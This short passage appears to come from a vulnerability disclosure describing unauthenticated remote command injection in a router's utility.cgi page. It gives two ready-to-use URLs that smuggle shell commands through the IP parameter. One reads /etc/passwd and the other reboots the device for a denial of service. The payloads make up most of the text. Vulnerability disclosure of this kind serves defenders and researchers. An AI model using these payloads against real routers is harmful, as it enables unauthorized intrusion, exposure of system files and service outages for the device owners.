####### Remote command execution  #######
 
http://1.2.3.4/utility.cgi?testType=1&IP=aaa || cat /etc/passwd
 
To see the command output you need to log into the router, however the
command is executed even the user is not logged in, so if you don't
have access to the device a DOS is also possible:
 
http://1.2.3.4/utility.cgi?testType=1&IP=aaa || reboot
